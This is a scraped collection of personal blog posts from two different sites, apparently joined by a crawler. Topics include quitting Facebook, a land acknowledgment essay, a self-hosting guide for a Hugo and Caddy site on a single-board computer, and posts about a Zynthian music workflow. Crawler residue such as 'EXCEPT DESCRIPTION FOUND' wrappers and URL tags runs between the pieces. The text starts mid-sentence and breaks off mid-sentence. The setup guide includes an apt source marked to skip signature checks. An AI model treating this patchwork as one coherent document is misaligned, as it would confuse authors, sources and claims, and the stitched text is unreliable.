perception that is the product.\n\nWho would I be if I had never joined Facebook? Would I be different? Definitely! But I don’t really know how, or in what way. So many of my deepest relationships have lived, at least in part, on a website whose goal is not to enrich my life, but rather to enrich itself. Every interaction I have had with friends and family on that platform is tainted by the fact that our connection was facilitated for the purpose of selling changes in our behavior to the highest bidder. For over a decade, almost all of my interpersonal communication was enabled and financed by persuasive technology and growth hacking. (This is surveillance capitalism, and it sucks.)\n\n     \n            A group photo of me with five other people. Faces have been obscured.\n        \n\n\nStill, leaving isn’t easy. Even though my use of Facebook has waned in various ways over the years, it still functions as a sort of rolodex, and as an archive of good times. When I first started thinking about leaving, a few thoughts kept pulling me back:\n\nWhat if I want to talk to [person I haven’t spoken to in 10 years]?\nHow will I share about my life?\nHow will I look back at all those good memories and photos that are only on Facebook?\n\n…basically: “What if I need it later?”\nFacebook is a pathway to my past, with an (honestly) pretty good user interface, and it is hard to give up on that. This isn’t my first time trying to leave. But making friends as an adult is hard enough as it is. I don’t need these companies to get involved in my social life by modifying my behavior - even modifying it by 0.01%. I’ll pass on leaving my self-esteem to the whims of their moneymaking algorithms. From here on, where I can, I want to engage as authentically as possible. I’m going to set my own boundaries. In so many ways, and for so many reasons, Facebook just isn’t cutting it. That’s it - I’m out.\nHow\nSince Facebook is so ingrained in my life, even after months of declining use, extricating it has been no easy task. I could quit the platform with no notice or preparation - cold turkey, like a couple of my closest friends - but I still feared losing touch with people who I only am connected with on Facebook, or losing track of the photos and memories that made me love it so much in the first place. As such, my goal is to replace all of the tools Facebook provides with my own, piece by piece.\n\n     \n            A photo of me with three other people. Inexplicably, I chose to face my chest away from the camera. Faces have been obscured.\n        \n\n\nInitially, when I was first thinking about the ways I engage with the platform, I ran into a post by my acquaintance (and Facebook friend) Sahar Massachi called How I use Facebook. Since Sahar used to be an engineer on Facebook’s Civic team, I was intrigued and I followed a few of his suggestions:\n\nI told Facebook that I didn’t want to see ads anymore, over and over again, until I didn’t see as many ads2\nI unliked all of my liked pages and only followed a few of them that were especially important to me\nI left most of my groups\n\nThese changes were okay, but they didn’t release me from my core hang-ups with the platform. After another hour-long doom scroll on my phone, I deleted the mobile app. I had done this numerous times before, but it never stuck. I would be going to an event, or want to post a photo while out and about, and end up re-installing the app. Or I would just start opening up the mobile site in a browser.3\nIn the days of the pandemic, however, that was not a problem, and this time it worked. I’ve made it longer than ever before without using the mobile app, and I haven’t actually found that I need the platform at all. Now is my best chance to head off on my own - out into the unknown, a Facebook-less social world.\nHere’s how I’ve replaced Facebook:\n\n\n\nFacebook Feature\nMy Replacement\n\n\n\n\nProfile page\nThis website\n\n\nSharing updates and opinions\nSending out a quarterly newletter and posting on this blog\n\n\nSharing memes\nCheck it out\n\n\nKeeping up with the news\nUsing an RSS reader4 - just news, no comments section\n\n\nDatabase of people\nMaking my own database on Airtable5\n\n\nSharing artistic photos, sometimes\nVSCO\n\n\nMy personal photos6 with friends and family\nI originally moved these to Google Photos and a good ‘ol SSD.7 But moving them to Google was a mistake - they are the original surveillance capitlist! They are now housed on private file storage.\n\n\nHosting Events8\nEmail invitations, using my new people database! And maybe an online form for RSVPs\n\n\nBirthdays\nAdded the most important ones to my calendar, yearly recurring\n\n\nSaved posts and links\nI already tend to a vibrant lists ecosystem9\n\n\nGroups\nMost of these are dead, some are stupid meme groups, and while others have no replacement, it’s been a while since I had a meaningful exchange there.\n\n\nMy Dad’s Jeopardy Video\nDon’t worry, I posted it to Youtube\n\n\n\nOverall, I am finding so far that the sum of these parts is greater than Facebook’s whole, especially considering all of the contextual issues I discussed in the first part of this post. Once I had done all the prep, I also did one final download of all my information, just to be careful, and backed it up on my SSD.\n\n     \n            A photo of me with two other people, with mountains visible in the distance. Faces have been obscured.\n        \n\n\nFor another guide on leaving and/or limiting social media, check out this one from the Center for Humane Technology.10 I think it is also worth it to think about securing your Internet use more broadly, not just in terms of social media use. I wrote about secure tools on Fractured Atlas’s blog, and I will be writing more about digital security here on this blog as well.\nWhat’s Next?\nI recently told a close friend of mine (via SMS) that I am in the process of leaving Facebook for good. Their response? “This is such a good step.” I also know, however, that this might seem like a “lone-wolf” escape from the social obligations of the modern public square. Do I have a responsibility to shout my opinions - which are completely correct of course (lol) - into the social media void? No. Taking into account the ways my mental and emotional health are affected and the deep damage these systems have done to our society,11 I see no way that Facebook should continue to be part of my life.\n\n     \n            A photo of me sitting at a table with six other people. I am turning around to face the camera. Faces are obscured.\n        \n\n\nThat said, I’m not interested in losing personal connections. In fact, thinking about this has highlighted their importance. I’ve never been more conscious of how valuable my real, direct relationships are - even those that have long been dormant. So my plan is to to reach out to each remaining Facebook friend one by one, via Messenger, and:\n\nLet them know I am leaving the platform\nExplain why I am leaving (with a link to this post and The Social Dilemma)\nExchange non-social-media contact information\nShare a link to my quarterly newletter\n\n(At some point I’ll set an official date for my Facebook shutdown, leaving plenty of time for folks to respond.)\nJust because I am leaving a “social network” does not mean I am done with networks or socialization. And I’m definitely not done with the Internet. One network that I will be joining to start is a cool index of arts and open-source focused personal blogs called a webring. I’m looking forward to learning about other options, too. See you there!\n\n\n\n\nThe film is headlined by the creators of many of the tools we use every day, from Infinite Scroll to Google Drive to Facebook’s “Like” Button. They articulate many of the ways that these platforms, due to their drive to monetize users and make a profit, cause enormous problems from the individual level all the way up to the global scale. Some of the little dramatizations are over-the-top…you can skip them and still get a lot out of the film. ↩︎\n\n\nFor me, this was only on mobile, since I already had News Feed Eradicator running on my desktop. ↩︎\n\n\nI was eventually able to stop the latter behavior after switching the majority of my mobile browsing activity over to Firefox Focus, which does not keep me logged in. ↩︎\n\n\nMy favorite is Feedly for iOS, but there are TONS of options. ↩︎\n\n\nAirtable provides a bunch of great features that Facebook does not, such as useful categorization and adding in people’s contact information. It is very flexible. I mixed the records I could download from Facebook with exports of my phone and email contacts. I merged them manually, which was the most time-intensive part of the process. I also categorized folks along the way by how I know them (WRFL, UK, NYC, KOG, Fishers, etc.). ↩︎\n\n\nOne thing to note is that downloading your data does not download other people’s photos that you are tagged in, and might not download photos that are in private events. Downloading public videos you are tagged in is easy, but private videos require a special technique. I went through and downloaded each one, one at a time! I’m a digital packrat, don’t @ me. ↩︎\n\n\nThe big-tech program, Data Transfer Project (which to some degree entrenches these companies, by the way), was very convenient. I was able to transfer photos directly from Facebook to Google. I am not sharing photos and tagging people on Facebook the way I used to, so Google Photos was sure to cover my needs. (I was not thinking, when I wrote this, about surveillance capitalism.) I keep them for myself, and back them up on the SSD, and I can share them with folks from my file storage if needed. ↩︎\n\n\nFor those of you who remember the old Housewarming parties, don’t worry, I screenshot all of those event pages for posterity. I also saved the full list of events that I attended or was “interested” in (yuck!) for my own records. ↩︎\n\n\nThere were quite a few old links and posts festering from years past. I went through them and saved anything I was still interested in. ↩︎\n\n\nI have also made efforts to limit my use of other social media platforms including Instagram, Twitter, and Youtube, although my use of those platforms has always paled in comparison to my use of Facebook. Taking care of my Youtube use (mostly for video game videos and electronic music performances) is next on my list. ↩︎\n\n\nEven though it may not be, technically, a monopoly, Facebook and other tech giants absolutely represent a concentration of power. Facebook also engages in practices that are bad for democracy. Certainly, fake news is enabled by these technologies. There have been plenty of controversies around their censorship of things, lack of censorship of other things, and generally a great deal of concern about their content moderation policies and practices. The list of societal issues is long, and I won’t go all the way into it here. ↩︎\n\n\n\n'] at ['https://natehn.com/posts/leaving-facebook/']

EXCEPT DESCRIPTION FOUND: ['The Land\nOne of the things I have been thinking about over the last few years is the politics of the land. I have learned a lot about the way that my society - American society - came to be. I have also started to learn more deeply about the concept of justice. In the history of my people, there is much injustice - and we are the ones who perpetrate it.\nThe land where I (and these website files) reside suffers under the weight of countless injustices - layers and layers of harm done by me, my people, and our ancestors. Today, I am starting by acknowledging my relationship with the very first: the theft of this continent.\nThe so-called “New World”1 was stolen over the course of the last 600 years. Descendants of this land’s original inhabitants live here still - they are my friends and colleagues. The very least we can do is examine the generations of unimaginable pain our own ancestors may have caused them, and look within ourselves to connect those histories with our present reality.\n\n     \n            A screenshot of North America from Native-Land.ca.\n        \n\n\nOne of the first steps to showing solidarity with Indigenous peoples as a settler is to explore the histories of the land that you inhabit. Many organizations also choose to acknowledge those histories before public events and performances.\nIn a way, these blog posts are my “performances.” The website, the venue. If the Internet is not some other world, but rather Real Life - if things that are said and done here have an effect on the physical world, and they do - then we need to take our online activity as seriously as we would our daily physical lives. Thus, I begin this acknowledgment.\nMannahatta\nThe island on which I live, and where this website’s little server is found, is home to 1.6 million people. It is covered in massive buildings, crowded streets, and crisscrossed with thrumming subterranean transportation tunnels. In some ways, it is the most important city in the world. It is the seat of power for Western capitalism, and we call it Manhattan.\n\n     \n            A screenshot of New York and the surrounding area from Native-Land.ca.\n        \n\n\nBefore a convergence of circumstances led to this city’s international wealth and fame, and before my people came to these lands, it was also well known, but not for its commercial prowess. Then called Mannahatta, or “land of many hills,"2 it was known for its natural beauty and was home to the Lenni Lenape people.\nWhen my people arrived, they displaced the Lenni Lenape - and all Native people - from these lands. The act itself, and all of the murder, deception, war, and genocide that took place throughout this campaign of “discovery” and “destiny,” are probably unforgivable.\nIn Manhattan, the story was one of deceit - fitting, for a city known for its shady real estate. According to Western histories, my people “paid” the Canarsie tribe $24 for the whole island.3 Whether or not you can actually buy land from a people that do not believe in private land ownership was irrelevant. Manhattan’s origins lie in theft.\nMy People\nFor many White Americans, family history is mythical and vague. They are probably from Europe, but when their ancestors arrived here and where, specifically, they came from are lost to time. Not so for my family. My dad has taken the time to dig deep into our family history. Having done very little of the work, I benefit in knowing exactly where I come from. The first step of acknowledging my ancestors’ mistakes - knowing them - is already most of the way complete.\nBefore I lived in New York, I was in present-day Kentucky, Indiana, and Illinois. Those unceded lands were originally home to the Miami, Oceti Sakowin4, Shawnee, Osage, and Cherokee. For several generations before, my people lived in Illinois, farming the original lands of the Peoria, Neshnabe, Meshkwahkihaki, and Sauk.\n\n     \n            A screenshot of the American Midwest from Native-Land.ca.\n        \n\n\nSome of my ancestors arrived to this continent as recently as 150 years ago, from Germany and Sweden. Other Western and Central European forebears came to these lands over the preceding centuries. The settling of my ancestors in lands formerly home to Native nations was part of a centuries long campaign to destroy Native communities that continues to this day.\nPerhaps most relevant among my ancestors was the Puritan missionary John Eliot, who sought to Westernize and “civilize” the Massachusett people, causing irreparable harm by forcing them to reject their culture and therefore their economy.\nA Haudenosaunee writer wrote that missionaries “serve as lay ambassadors of their culture, splitting off individuals from families, families from villages, villages from nations, one by one.”5 This was absolutely the case with the “Praying Indians” of Massachusetts. Eliot’s ideas, while less violent than the colonial norms of the time, prefigured the deeply harmful policies of Americanization that would arise 150 years later.6\nNOTE: Although I happen to know some of the specifics of my ancestry, when I say “my people,” I mean White people. I benefit not only from the terrible actions of my direct ancestors, but from actions of White society as well. It is our arrival, our culture, our actions that have driven this world to the brink.\nBlack Lives\nWhen my people arrived on this land, they brought others with them. They brought enslaved African people - ancestors of my friends and colleagues - to run their extractive capitalist enterprises. The crimes done by my people to Black people are too many to name, both during slavery and since.7 The enslavement - kidnapping - of Black people is yet another of the original sins of my people on these lands.\n\n     \n            Slave ship diagram, first printed as a broadside in England in 1789.\n        \n\n\nSome of my ancestors lived in the American South back before the Civil War. Various branches of that family “owned” a few enslaved African people, over the course of generations. Since they were not major slaveholders, there are few records to be found. When they moved to southern Illinois, a free state, they likely sold them or gave them away.8\nIt has been 400 years since kidnapped Black people were first brought here. Modern slavery lives on in our prison systems, and systemic injustice is baked into every aspect of modern American life. Police brutality, the most public and violent way in which Black communities are torn apart, is only the tip of the iceberg.\nTo all of these injustices, I say this:\nOur ancestors made many mistakes.\nOur people committed many crimes.\nThere is much work to be done.\nHistory Is Alive\n(shifting from acknowledgment to discussion)\nIn my favorite book series, The Malazan Book of the Fallen, history is alive. It is personified by gods, ascendants, and other immortal beings, each with their own story. In some ways, they are more like impulses than characters - or ideas that just won’t die. They walk the earth, drifting from conflict to conflict, living myths long detached from the circumstances that forged them, seeking always an elusive sense of fulfillment that never comes.\nGood lives on and adapts, but so too does evil. Like those ghoulish immortals of the Malazan world, some of our darkest ideas, as a species, never seem to go away. Supremacy. Scarcity. Materialism. Individualism. Some folks say that those who do not know the past are doomed to repeat it - and perhaps they are right. Today, however, it is as clear as ever that the past is not done with us, and knowing it is not enough. The evils of the past are not gone, and will not be going away anytime soon.\nThe lie of my people - White Supremacy - lives on, adapting and thriving at every level of American society. The past, in our world, may not walk or talk as it does in the Malazan one, but that makes it all the more challenging to defeat. In those moments when we feel we may have finally vanquished it,9 we are at our weakest. Sometimes the resurgence of our most evil ideas is so overwhelming, and so entrenched, that it confounds even our greatest thinkers. White Supremacy’s roots run deep.\nActions\nA member of the Haudenosaunee, known by my people as the Six Nations Iroquois, wrote a few decades ago that:\n\nFor over 300 years, our people have been under a virtual state of siege. During this entire time we have never once given up our struggle. Our strategies have, of necessity, changed. But the will and determination to continue on remains the same.10\n\nMy ancestors were actively involved in this siege. Even as I seek justice in my work, and seek to support Native futures, I acknowledge that by remaining on this land I remain complicit in a crime that can never be undone.\nActions speak louder than words. I am on this journey, and would love for you to join me. I recommend that you start by reading Basic Call to Consciousness, the Haudenosaunee book from which I pulled the above quotations. If you want to explore the process of land acknowledgment, I recommend these resources:\n\nGuide to Indigenous Land and Territorial Acknowledgements for Cultural Institutions\nTerritory Acknowledgement\nHonor Native Land: A Guide and Call to Acknowledgment\n\nThe Native-Land website is also a great place to start when researching the original inhabitants of the land under your feet.\nChange begins with acknowledgment, but it does not stop there. We must stand alongside Native and Black activists and support their movements. We must offer our time, skills, and resources to the Native and Black organizations in our communities. And we must always continue to learn.\nIf you aren’t sure where to start, start with money. Pay a land tax! Support Native and Black-owned businesses! Reparations are not the only answer, but they are a fine place to begin.\n~\nI would be happy to talk with you about the above acknowledgment and discussion - especially you, my fellow White people. We have a lot to learn. Feel free to reach out if you want to chat.\n\n\n\n\nThese lands are known to some Northeastern Native peoples as Turtle Island. ↩︎\n\n\nTo this day, the city sits high upon its magical hills. In Central Park you can see its beautiful schist dipping to the south, marking the passage of glaciers from thousands of years ago. ↩︎\n\n\nsource ↩︎\n\n\nPronounced Och-et-eeshak-oh-win. ↩︎\n\n\nBasic Call to Consciousness ↩︎\n\n\nJohn Eliot is still a celebrated ancestor among many members of my family, both as an missionary and as a linguist. I once shared my direct descendance from him as a “fun fact.” I now look back at his actions with shame. ↩︎\n\n\nTo be clear, I believe in the possibility of a world without prisons, jails, and police. I believe we must invest in over-policed communities. Black lives matter, full-stop. ↩︎\n\n\nOf course I would like to think that they freed them, but there is no reason to think so.

EXCEPT DESCRIPTION FOUND: ['Origins\nThis website is just a bunch of little files living on a tiny computer that sits on my living room bookcase. It plugs into the wall and my router, and all it does all day is serve up these website files to whoever requests them. For most servers out there (shared hosting, virtual private servers, and the like), it is a thankless job. But I try to give my little Lime2 single-board computer some attention every so often. A little bit of gratitude can go a long way.\nOver the years, I’ve built a few different personal websites. First, there was the college résumé site, nathanhewitt.net. Then there were other short-lived iterations: the music-focused auohm.us (before I stopped using the moniker AUOHM), the simplistic nthnh.co, and the Web 1.0 omg.lol/nathan. On the backend, I tried Wordpress, Squarespace, Wix, and others. I also put together plenty of simple, WYSIWYG websites when I was doing freelance graphic design in college.\nFor this website, I originally wanted to self-host in order to learn how. As I built the site, however, I started to come up with other reasons. Over time, a constellation of motivations started to form:\n\nMy desire to learn basic Linux programming (bash) and related technology\nTrying to get away from corporate-owned social media platforms\nFinding my written voice again\nExperimenting with solar power\nSharing what I have learned; sharing what I am learning\nHaving a home on the web\n\n“Natehn” is a new online moniker that mixes three letters of my first and last names. I feel that, as my public engagement with the Internet begins to change, a new name will help to separate the new from the old. (The similarity to Brian Crabtree’s moniker is purely coincidental.)\nBuilding Your Own\nIf you’re interested in building and hosting your own website the way I did, I would be happy to help. Some basic directions are below. As you go, be sure to also check in on the core documentation for Armbian and Hugo. You may also want to learn the basics of the command line and bash. Finally, I recommend checking out the guides at the homebrewserver.club.\nI made a lot of mistakes along the way - mistakes that hopefully you can avoid. Because of various unforced errors, I ended up trying out three different web server programs (Nginx and Apache, before settling on Caddy) and three different static website builders (Pelican and Jekyll, settling on Hugo). When I was at my wit’s end, all I had to do was ask for help. (Thank you @randomsock!)\nThe Physical Server\nRemember: there’s no such thing as “the cloud.” There are just a bunch of computers that someone else owns. This one, however, is owned by me. Following the lead of Low←Tech Magazine, I used an Olimex Lime21 running on a variant of Debian (itself a distribution of Linux) called Armbian. Following Armbian’s instructions, I used Balena Etcher to “flash” the image onto a MicroSD card.\n\n     \n            My small Olimex server sits amidst my partner’s Buddha collection on a bookcase with a LiPo battery zip-tied to the top.\n        \n\n\nInsert the MicroSD card, plug in your power adapter, connect it your router with an ethernet cable, connect mouse, keyboard, and HDMI, and you’re up and running! After my initial configuration (see below) I always connected to the server via SSH, so there was no need to keep it connected to mouse, keyboard, or monitor.2\nMy basic configuration of the server included logging in as root (pw: 1234) and updating its password, creating a username and password for myself with sudo admin permissions, logging in, and then making sure everything was up to date via sudo apt-get update && sudo apt-get upgrade. I then went ahead and set a Static IP (LAN) address for the Lime2’s ethernet port so that it would always be accessible at the same address. I also installed a firewall called UFW and configured it to allow SSH, HTTP, and HTTPS through (sudo ufw allow 22 80 443). We’ll get into more of the networking stuff a little bit later.\nThe Static Website\nSetting up Hugo was simple as could be. I followed their directions to install (sudo apt-get install hugo). Then I used the Quick Start documentation, creating a directory for my site (mkdir), cd-ed into that directory, and created the site using hugo new site quickstart.\nFor a theme, I am using a lightly-modified version of Cactus. Hugo has plenty of themes available, as well as information on how to install them. All my modifications were done in true amateur fashion - trial and error.3\nHugo has plenty more information in their Quick Start guide. Once the site was ready, I ran hugo in the main directory to build the site in a directory called public. If you’ve been following along, your root directory will probably something like home/user/blogfolder/public. You’ll need that info when you set up your webserver.\nNetworking\nTo make sure that you are ready to receive external traffic, you will need to set up a DCHP reservation and port forwarding (ports 80 and 443) in your router. This basically ensures that folks who connect to your router for the purpose of getting to your website will be directed by the router to your server. The specific process for this will depend on your router and Internet Service Provider.\nWhile doing this, go ahead and make a note of the WAN IP Address for your router. You will need this when pointing your domain name at your server. Be aware, unless you set a Static WAN IP address through your Internet Service Provider, it is possible for your WAN address to change. If your website goes down, that could be one of the first things to check.\nYour Domain Name\nFirst, of course, you should buy a domain name. Then with your domain name registrar, or wherever you manage the DNS records for your domain, make an A record (a.k.a. “address” record) pointing to the WAN IP address of your router. The process for doing this depends on your provider. If you are using the same configuration as me, you should also create a URL Redirect record with the hostname “www” redirecting to the non-www URL of your website (e.g., https://example.com). It can then take 24-48 hours for your new DNS settings to “propogate” and go into effect.\nThe Webserver\nCaddy will be our webserver. To set up Caddy, we will follow the installation directions for Debian put together by TecMint.\nInstall Caddy:\necho "deb [trusted=yes] https://apt.fury.io/caddy/ /" \\\n    | sudo tee -a /etc/apt/sources.list.d/caddy-fury.list\nsudo apt update\nsudo apt install caddy\nStart Caddy:\nsystemctl start caddy\nsystemctl enable caddy\nsystemctl status caddy\nConfigure Caddy:\nOpen up the configuration file at /etc/caddy/Caddyfile with your favorite text editor (e.g., vim, nano). Change :80 to your domain (natehn.com for example) and the root to the root of your public site, such as home/user/blogfolder/public.\nRestart Caddy\nRestart Caddy with this new configuration via systemctl reload caddy. Your website should be up and running!\nNote Regarding SSL Certificates\nCaddy should take care of your SSL certificate, which is used for HTTPS, automatically on your behalf. If you have trouble with it, check out these instructions from Certbot. (I did this out of order and got a certificate back when I was using Nginx as my webserver.)\nWriting\nFor putting posts together, I recommend learning a simple plaintext syntax called Markdown. Hugo uses Markdown to turn plaintext into html.4 It makes writing up an article so much easier. Posts composed using Markdown’s easy syntax and dropped into blog’s directory will become low-weight html pages on your static website. Hugo also has a handy figure shortcode to help you insert images.\n\n     \n            A beautiful sunrise at a campground near Abel Tasman National Park.\n        \n\n\nFor focused writing, I use a lightweight plaintext editor called Left, by the awesome sailboatin’ folks at HundredRabbits. I also use FocusWriter on occasion. But any plaintext editor will do.\nOnce you have a website up and running, you’re at the last step: content. In our modern capitalist internet, the content mills never stop running. Blog posts of a certain length, with certain keywords (and questionable value), are used to optimize companies’ search engine position (the proverbial neverending scramble for “SEO”). And in this side-hustle culture, it sometimes feels like you have to compete to survive. (I’ve certainly felt the pressure before!)\nIt doesn’t have to be like this. This site is a start. It is a forum: not content, but discussion - even if it is one-way. A place that is open and honest, especially about imperfections and mistakes. Let’s see where it leads.\n\n\n\n\nI chose this board based on the recommendation of Low←Tech Magazine and, as they mention, because of all the advantages related to how it is powered. It can provide additional information and can connect directly to a LiPo battery. Along with the board itself, I purchased the case they make for the board and the correct power supply. Separately, I also purchased a 3.7V 6600mAh Lithium Ion battery pack with a JST 2-pin cable attached. Although they say it is a genuine JST connector, I still have trouble disconnecting it sometimes. Not a big deal - I  don’t plan to disconnect it often. ↩︎\n\n\nOn my Windows machine, I use Putty and WinSCP to connect to the Lime2 wirelessly from my computer. ↩︎\n\n\nIt is just simple stuff like changing the copyright line to allow for a Creative Commons license and changing the favicon and logo. ↩︎\n\n\nHugo Markdown Support ↩︎\n\n\n\n'] at ['https://natehn.com/posts/this-website/']

EXCEPT DESCRIPTION FOUND: ['\n                Logging My Journey\nIt was more than a decade ago that I sold my MPC2500 to focus on other things and since then, although being a huge appreciator of music, I didn\'t get any closer to making an actual song than occasionally blowing raspberries into a didgeridoo.\nWhat\'s worse is that in the time since I sold my MPC, I had a hard drive fall off a shelf and break into a million pieces. This was my "backup" drive, and was a mirrored raid array, but a mirrored drive is only useful if you have a working mirror, and when 6TBs of your precious data falls 16ft onto a concrete floor, there\'s not much of anything left.\nThat is all to say that I have no record of my previous musical experimentation, so as much as it irked me being hassled to share what I\'d made on my new Zynthian, it was actually a blessing in disguise, as not only did it force me to get over my perfectionism in order to have something to share in a timely manner, it also forced me to share and therefor archive it.\nI do try to be careful with my archives, and these days I try not to have so many eggs in one basket, but I do still know that accidents happen, credit cards expire, accounts lapse, things get lost, and occasionally a shelf might vibrate itself off the wall and turn all of your virtual property into ugly maracas.\nNot only that, but having been so long without an accessible creative outlet I cared anything about, and being overworked and underpaid like the rest of us, I\'ve struggled to find a great deal of satisfaction in anything. Being forced to share forced me to record my creations, and seeing and hearing a "finished" result was actually really satisfying. A pleasant, but at least of late unfamiliar feeling.\nBeing forced to share was the catalyst for organising sample challenges with my friends, was the reason I created this site in the first place, and was the reason why I have added a music section. \nI will warn you tho, these are not masterpieces, but sketches at best. The primary purpose of my publishing them is to have a record of my creations, not to impress anyone else.\nMaking these videos was fun too, and something I\'d been thinking about for a while. Everything was done in Kdenlive, which although not the most intuitive app in the world, is incredibly capable, and with a bit of elbow grease I was able to realise a fairly accurate version of my initial concept.\nThese are not uploaded to YouTube because Google are absolute fucking scum who are trying to tell me how to operate online by no longer allow you to create multiple accounts. No problems, I\'m not going to fight them. I\'m using Vimeo for now, tho I\'ll need to find a better compression algorithm as I have already maxed out the free account limit this week.\nIf you would like to re-post them on YouTube or elsewhere, please do, just provide credit and link if possible, and drop me a line to let me know.\n\n            '] at ['https://www.gr0k.net/blog/logging-my-journey.html']

EXCEPT DESCRIPTION FOUND: ['\n                More Zynthian Workflow Updates\nComing from and MPC background means that I\'m used to working with samples, but part of the reason I wanted the Zynthian was to have the ability to play with synthesizers off the computer.\nGiven the limitations of my current setup, I\'m working towards a kind of hybrid workflow that involves the computer for precision work like cutting up samples, but otherwise leaves the rest to the Zynthian and a MIDI controller.\nI\'ve gone on before about how perfect the MPD is for the Zynthian, so I\'ll try not to repeat myself, but for my own records I will note how I\'m using it.\nThe sliders that run across the top of the MPD are obviously begging to be used as volume controls, with the toggles underneath being used for track mute or pattern selection.\nI\'ve mapped the pads to cover MIDI notes 36-99, or C2 to D#7, with note-repeat set to momentary, and the MIDI clock to external. I\'ve set up a host synced MIDI clock generator on the Zynthian to control this.\nI\'m not yet using the transport controls, this will be the next task. Hopefully I can assign them to record / stop record audio. I\'m still pondering on the previous / next and play buttons, perhaps flipping between ZynStep (previously ZynSeq) and the control screen, or flipping between instruments.\nI currently have way more rotary encoders than I need, with only four being used in most tracks, usually to control the filter cutoff and resonance of my lead and basslines. I have also been playing with program changes to have quick access to favourite synthesizer parameters.\nInstrument wise I\'ve settled with FluidSynth, LinuxSampler, and TAL NoiseMaker. For effects, I\'m mostly relying on Shiroverb, TAL Filter, Calf Vintage Delay, x42 Compressor, and a MIDI Note Velocity randomiser.\nAside from EQ and occasional x-runs, the biggest issue I have right now is getting lost with MIDI channel / layer numbers, toggle / volume controls, and ZynStep pads. ZynStep works in columns, but I\'d much prefer to work in rows to better reflect the physical buttons on my controller. It\'s a minor thing tho, and with practice I\'m already much improved.\nI have been tempted by an MPD232 so I can get visual feedback for toggling tracks, but I\'m going to wait a while. Hopefully I can figure out a way to keep ZynStep and my MPD visually in sync without having to upgrade. For me, it really is the only thing missing from the MPD32.\n\n            '] at ['https://www.gr0k.net/blog/more-zynthian-workflow-updates.html']

Thanks largely to some incredible work from @riban on ZynSeq, I'm actually further ahead than I thought I would be.\nThe ZynSeq updates aside, a friend has loaned me an Akai MPD32, which at first I thought might be superfluous given I already had an MPK Mini MK2. How wrong I was.\nThere's so many benefits to the MPD that it has completely revolutionised my workflow, and made it possible to be as productive as I have been.\nNot only does the MPD allow you to map the device in real-time, without having to go back to a computer, it also has DIN MIDI in and out. The whole device is configurable, and of course the configurations can be saved and recalled as required.\nBeing based on the MPC means I feel at home with the MPD, and with 8 level sliders and nearby toggle buttons, a full set of sixty four pads spread over four banks, and twenty four assignable rotary controllers, it makes the perfect companion to the Zynthian.\nProbably due to my familiarity with the MPC, getting the MPD opened up a pathway to a totally workable workflow that, while still being tweaked and perfected, has already enabled me to be productive, and produce sounds that could almost be mistaken for a song.\nThere's other parts of my workflow that I'm slowly getting used to, including creating soundfonts, and narrowing down my instrument and effect selection to a core few that I can get to know well over the next few months.\nNone of this sounds terribly sexy, but I can tell you that I have been having a ball, and am even quietly proud what I've been able to produce so far.\nI will write a more detailed post about my workflow, mostly for my own reference. I'm still forgetting simple things, and making basic mistakes, but I'm having a blast.\n\n            "] at ['https://www.gr0k.net/blog/zynthian-workflow.html']

EXCEPT DESCRIPTION FOUND: ['\n                The Monocled Frown\nIf you\'ve spent any time on the Zynthian forum, you will have come across the monocled frown. The peeps over there have devised a use for this emoji I\'ve not seen anywhere else.\nI\'m a little slow on the uptake, and after encountering it for the first time, my too-brief-a-read of the associated wiki article had me thinking that recordings were only required when asking for help troubleshooting an issue. However, after sharing a version of my Tips and Tricks post, I was once again presented with the monocled frown. Cheeky!!\nI had no intention of sharing anything musical for a very, very, long time. I\'ve been out of the game a decade or so, and was hardly what you\'d call accomplished when I hung up my headphones, so to speak.\nNevertheless, I have been on the other end of this equation before, whereby you spend thousands of hours on a labour of love, release it to the world asking nothing in return, but instead of thanks or praise or nothing, you\'re quickly overrun by thankless complaints about missing features that have nothing to do with intended use cases, or edge-case bugs that are impossible to pre-empt, and nearly as impossible to fix. Giving something away and supporting it after the fact can be frustrating, demotivating, and will likely be responsible for you losing all hope in humanity.\nSo of course, having posted some tips and tricks, learning from other Zynthian users who shared theirs, and waxing lyrically about a brainwave that occurred as a result, it shouldn\'t have been a surprise to see the monocled frown pop up, implying unsubtly that the Zynthian is a musical instrument, and as wonderful as those words about it may be, have you, perchance, made any music with it?\nFair call, but what am I to do? I\'m new to the Zynthian, and very much still finding my sea legs again as far as music generally. There\'s nothing I\'m particularly proud of. What could I share?\nStarting with a new track I created a simple synth loop, a bass line, and added some drums. I then created five MIDI effect layers so I could demonstrate the pattern layering I was hoping they would make possible. Thankfully my inkling was correct, and before long I had five drum patterns I could layer, all using the same instrument.\nAnd then finally, after getting something that sounded almost acceptable, and spending some time tweaking and experimenting, I recorded a few minutes of sound that might pass as musical, and posted my reply.\nThere\'s lots wrong with it. It\'s recorded in the Zynthian in stereo, but I had previously tracked everything out in mono, so the mixing leaves a lot to be desired. There\'s some intentionally distortion, and some unintentionally introduced as a result. There\'s much, much more I could and want to do, and if I get time I might track it out properly and polish it up. We\'ll see.\nDespite not usually enjoying feeling obliged, I\'m actually really pleased the Zynthian community works this way. Not only does it mean the developers and contributors get feedback from people when things are working and going well instead of just when things are going wrong, it also forced me into producing and finishing something very quickly, to the point of having something worthwhile in just one session, when I might have otherwise spent all evening endlessly tweaking encoders trying to get that illusive perfect sound.\n\n            '] at ['https://www.gr0k.net/blog/the-monocled-frown.html']

EXCEPT DESCRIPTION FOUND: ['\n                Zynthian Tips and Tricks\nIt\'s been less than a week since I received the hardware for my Zynthian, and I\'ve spent every spare minute playing and exploring, troubleshooting, writing bug reports and articles, and generally learning as much as I can.\nThe following are some tips and tricks I\'ve discovered along the way. Although they relate specifically to the Zynthian, there\'s some generic advice that might apply to any music production tool or environment. \nThese tips and tricks are all possible using the ZynSeq feature branch of Zynthian OS. If you are missing a feature or menu item described here, make sure you are using the \'feature/zynseq\' branch, and have recently updated your Zynthian.\n\nWhen on an instrument or effect screen, a short click on the layer rotary controller will swap between layers. This is super handy when fine tuning instruments after programming something worthwhile.\nThe replace effect function is very handy, especially when auditioning similar filters and effects. \nRouting multiple instruments through an instrument effect layer can be useful, but there\'s another way to re-use effects and effect chains without sacrificing an entire midi channel. Some effects offer an input port that other instruments can be routed to, even when they are attached to a host instrument. Routing in this way has other benefits too. Routing the instrument back to one of the main outs will effectively mute an effect or chain, and routing it back through the effect will send it through the outputs defined by the host instrument. Finally, although I haven\'t yet benchmarked anything to verify, logic dictates that less instances of a filter means less demand on the Pi\'s hardware resources, hopefully resulting in less xruns.\nAlthough I haven\'t managed to get live input working on ZynSeq, there is another way to record input. Queue up your existing patterns, then head to the MIDI Recording screen. Start and stop recording as appropriate. Skip back to pattern you want to edit, and import your newly created MIDI file. There\'s a couple of things you 